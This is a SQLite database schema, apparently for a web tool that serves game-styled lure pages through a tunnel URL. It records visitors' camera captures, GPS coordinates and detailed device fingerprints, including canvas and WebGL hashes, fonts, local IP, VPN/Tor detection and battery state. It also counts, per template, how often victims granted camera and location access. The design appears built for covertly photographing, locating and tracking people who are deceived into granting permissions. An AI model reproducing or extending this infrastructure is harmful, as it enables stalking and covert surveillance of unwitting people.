PRAGMA journal_mode=WAL;

CREATE TABLE IF NOT EXISTS sessions (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL DEFAULT 'default',
    template_id TEXT NOT NULL DEFAULT 'face-runner',
    tunnel_url TEXT,
    status TEXT NOT NULL DEFAULT 'active',
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    updated_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);

CREATE TABLE IF NOT EXISTS captures (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL DEFAULT 'default',
    filename TEXT NOT NULL,
    file_type TEXT NOT NULL DEFAULT 'image/png',
    file_size INTEGER NOT NULL DEFAULT 0,
    file_path TEXT NOT NULL,
    capture_method TEXT DEFAULT 'canvas',
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
CREATE INDEX IF NOT EXISTS idx_captures_session ON captures(session_id);
CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at DESC);

CREATE TABLE IF NOT EXISTS locations (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL DEFAULT 'default',
    latitude REAL NOT NULL,
    longitude REAL NOT NULL,
    accuracy REAL,
    altitude REAL,
    heading REAL,
    speed REAL,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
CREATE INDEX IF NOT EXISTS idx_locations_session ON locations(session_id);
CREATE INDEX IF NOT EXISTS idx_locations_created ON locations(created_at DESC);

CREATE TABLE IF NOT EXISTS ip_logs (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL DEFAULT 'default',
    ip_address TEXT NOT NULL,
    user_agent TEXT,
    device TEXT,
    browser TEXT,
    os TEXT,
    local_ip TEXT,
    is_vpn INTEGER DEFAULT 0,
    is_tor INTEGER DEFAULT 0,
    connection_type TEXT,
    screen_resolution TEXT,
    color_depth INTEGER,
    timezone TEXT,
    language TEXT,
    platform TEXT,
    hardware_concurrency INTEGER,
    device_memory REAL,
    battery_level REAL,
    battery_charging INTEGER,
    canvas_fingerprint TEXT,
    webgl_fingerprint TEXT,
    font_list TEXT,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
CREATE INDEX IF NOT EXISTS idx_ips_session ON ip_logs(session_id);
CREATE INDEX IF NOT EXISTS idx_ips_created ON ip_logs(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_ips_fingerprint ON ip_logs(canvas_fingerprint);

CREATE TABLE IF NOT EXISTS templates (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    description TEXT,
    file_path TEXT NOT NULL,
    category TEXT DEFAULT 'game',
    total_served INTEGER DEFAULT 0,
    total_camera_grants INTEGER DEFAULT 0,
    total_location_grants INTEGER DEFAULT 0,
    avg_engagement_seconds REAL DEFAULT 0,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);

CREATE TABLE IF NOT EXISTS audit_log (
    id TEXT PRIMARY KEY,
    actor TEXT NOT NULL DEFAULT 'system',
    action TEXT NOT NULL,
    resource_type TEXT NOT NULL,
    resource_id TEXT,
    session_id TEXT,
    details TEXT,
    ip_address TEXT,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
CREATE INDEX IF NOT EXISTS idx_audit_session ON audit_log(session_id);
CREATE INDEX IF NOT EXISTS idx_audit_created ON audit_log(created_at DESC);

CREATE TABLE IF NOT EXISTS events (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL DEFAULT 'default',
    event_type TEXT NOT NULL,
    event_data TEXT,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
);
CREATE INDEX IF NOT EXISTS idx_events_session ON events(session_id);
CREATE INDEX IF NOT EXISTS idx_events_created ON events(created_at DESC);

INSERT OR IGNORE INTO sessions (id, name, template_id, status)
VALUES ('default', 'default', 'face-runner', 'active');
